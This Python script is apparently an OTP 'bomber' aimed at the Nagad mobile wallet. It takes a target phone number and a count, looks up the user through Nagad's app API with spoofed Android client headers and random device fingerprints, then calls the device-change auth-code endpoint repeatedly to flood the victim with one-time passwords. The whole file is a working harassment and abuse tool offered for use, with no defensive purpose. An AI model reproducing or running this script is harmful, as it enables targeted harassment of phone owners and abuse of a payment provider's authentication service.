import time
import requests
import secrets
import json
import os

green = "\x1b[38;5;46m"
RED = "\033[0;31m"

class NagadOtpApi:    
    def __init__(self):        
        self.animate_banner()        
        self.Number = input(green + "[*] Enter the Number  : ")        
        self.Amount = int(input(green + "[+] Enter the Amount : "))        
        self.check_user_status()        
        print("-" * 50)        
        self.send_otp()    
    
    def clear_screen(self):        
        os.system('cls' if os.name == 'nt' else 'clear')    
    
    def banner(self):        
        print(green + r'''
_________                                     
/   _____/____ _________  _  _______ _______    
\_____  \\__  \\_  __ \ \/ \/ /\__  \\_  __ \   
/        \/ __ \|  | \/\     /  / __ \|  | \/   
/_______  (____  /__|    \/\_/  (____  /__|       
        \/     \/                    \/          
                  Coded By : Safwan
''')
    
    def animate_banner(self, num_iterations=3, delay=0.2):        
        for _ in range(num_iterations):            
            self.clear_screen()            
            self.banner()            
            time.sleep(delay)    
    
    def check_user_status(self):        
        url = "https://app.mynagad.com:20002/api/user/check-user-status-for-log-in"        
        params = {            
            'msisdn': self.Number        
        }        
        headers = {            
            'User-Agent': "okhttp/3.14.9",            
            'Connection': "Keep-Alive",            
            'Accept-Encoding': "gzip",            
            'X-KM-UserId': None,            
            'X-KM-User-AspId': "100012345612345",            
            'X-KM-User-Agent': "ANDROID/1152",            
            'X-KM-DEVICE-FGP': secrets.token_hex(32).upper(),            
            'X-KM-Accept-language': "bn",            
            'X-KM-AppCode': "01"        
        }        
        response = requests.get(url, params=params, headers=headers).json()        
        try:            
            status = response['status']            
            if status == "ACTIVE":                
                self.userId = response['userId']            
            else:                
                print(RED + "Nagad user not found or inactive.")                
                exit()        
        except KeyError:            
            print(RED + "Nagad user not found !!!")            
            exit()

    def send_otp(self):        
        url = "https://app.mynagad.com:20002/api/wallet/generateAuthCode/deviceChange"        
        payload = json.dumps({        
            "userId": self.userId        
        })        
        headers = {        
            'User-Agent': "okhttp/3.14.9",        
            'Connection': "Keep-Alive",        
            'Accept-Encoding': "gzip",        
            'X-KM-User-AspId': "100012345612345",        
            'X-KM-User-Agent': "ANDROID/1152",        
            'X-KM-DEVICE-FGP': secrets.token_hex(32).upper(),        
            'X-KM-Accept-language': "bn",        
            'X-KM-AppCode': "01",        
            'Content-Type': "application/json; charset=UTF-8",        
        }        
        for i in range(self.Amount):            
            try:                
                response = requests.post(url, data=payload, headers=headers).json()                
                response_ = response["executionStatus"]                
                if response_["statusType"] == "EXECUTED_SUCCESS":                    
                    print(green + f"\r[+] OTP sent Amount: [{i+1} / {self.Amount}]", end="")            
            except KeyError:                
                print(RED + "Failed to send OTP")

Nagad = NagadOtpApi()